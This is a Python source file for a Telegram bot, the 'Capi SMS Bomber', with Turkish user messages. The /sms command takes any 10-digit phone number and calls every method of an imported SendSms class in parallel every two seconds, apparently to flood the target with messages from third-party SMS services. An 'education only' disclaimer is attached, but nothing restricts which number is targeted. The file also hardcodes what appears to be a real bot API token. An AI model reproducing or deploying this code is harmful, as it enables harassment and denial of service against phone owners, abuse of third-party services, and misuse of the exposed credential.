import asyncio
import logging
from sms import SendSms
from aiogram import Bot, Dispatcher, types
from aiogram.types import Message
from aiogram.utils import executor
from concurrent.futures import ThreadPoolExecutor
from os import getenv

API_TOKEN = "7107604320:AAEcx_S-aa8IwW8PiOWcAdNm_dAX0EczFX4"  # Güvenlik için .env'den çekebilirsin

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
executor_thread = ThreadPoolExecutor(max_workers=50)

active_tasks = {}
status_counts = {}

# /start komutu
@dp.message_handler(commands=["start"])
async def start_handler(message: Message):
    await message.answer(
        "<b>🚀 Capi SMS Bomber Botuna Hoş Geldin!</b>\n\n"
        "Bu bot ile <b>eğitim ve test amaçlı</b> SMS servislerini deneyimleyebilirsin.\n\n"
        "<b>Kullanılabilir Komutlar:</b>\n"
        "📲 <code>/sms <telefon></code> - SMS saldırısını başlat\n"
        "⛔ <code>/stop</code> - Gönderimi durdur\n"
        "ℹ️ <code>/help</code> - Yardım menüsü\n\n"
        "⚠️ Bu proje sadece <b>eğitim içindir</b>. Lütfen kendi numaranız dışında kullanmayınız.",
        parse_mode="HTML"
    )

# /help komutu
@dp.message_handler(commands=["help"])
async def help_handler(message: Message):
    await message.answer(
        "<b>📘 Yardım Menüsü</b>\n\n"
        "<code>/sms 5551234567</code> → SMS servislerini başlatır\n"
        "<code>/stop</code> → Aktif spam işlemini durdurur\n"
        "<code>/start</code> → Hoş geldin mesajı gösterir\n\n"
        "Tüm işlemler <b>etik testler</b> için tasarlanmıştır.",
        parse_mode="HTML"
    )

# /sms komutu
@dp.message_handler(lambda message: message.text.startswith("/sms "))
async def sms_handler(message: Message):
    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit() or len(args[1]) != 10:
        await message.reply("Lütfen 10 haneli bir telefon numarası girin. Örn: /sms 5551234567")
        return

    user_id = message.chat.id
    tel_no = args[1]
    send_sms = SendSms(tel_no, "")

    # Dinamik servisleri al
    services = [
        getattr(send_sms, svc)
        for svc in dir(SendSms)
        if callable(getattr(SendSms, svc)) and not svc.startswith("__")
    ]
    servis_sayisi = len(services)

    status_counts[user_id] = {"basarili": 0, "basarisiz": 0}

    await message.reply(
        f"🚀 <b>SMS Gönderimi Başlatıldı</b>\n"
        f"📲 <b>Numara:</b> <code>{tel_no}</code>\n"
        f"🔧 <b>Aktif Servis Sayısı:</b> <code>{servis_sayisi}</code>\n"
        f"♻️ <b>Her 2 saniyede bir tekrar eder</b>.\n"
        f"<i>Durdurmak için /stop yazabilirsin.</i>",
        parse_mode="HTML"
    )

    status_message = await message.answer("⏳ Gönderim durumu hazırlanıyor...")

    async def spam_sms():
        while user_id in active_tasks:
            loop = asyncio.get_event_loop()
            futures = [loop.run_in_executor(executor_thread, service) for service in services]
            results = await asyncio.gather(*futures, return_exceptions=True)

            for result in results:
                if isinstance(result, Exception):
                    status_counts[user_id]["basarisiz"] += 1
                else:
                    status_counts[user_id]["basarili"] += 1

            await status_message.edit_text(
                f"<b>📊 Gönderim Durumu</b>\n"
                f"✅ Başarılı: <code>{status_counts[user_id]['basarili']}</code>\n"
                f"❌ Başarısız: <code>{status_counts[user_id]['basarisiz']}</code>\n"
                f"🔁 Döngüdeki servis sayısı: <code>{servis_sayisi}</code>",
                parse_mode="HTML"
            )
            await asyncio.sleep(2)

    active_tasks[user_id] = asyncio.create_task(spam_sms())

# /stop komutu
@dp.message_handler(commands=["stop"])
async def stop_handler(message: Message):
    user_id = message.chat.id
    task = active_tasks.pop(user_id, None)
    if task:
        task.cancel()
        await message.reply("⛔ SMS gönderimi durduruldu.")
    else:
        await message.reply("Zaten aktif bir işlem yok.")

# Botu başlat
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    executor.start_polling(dp, skip_updates=True)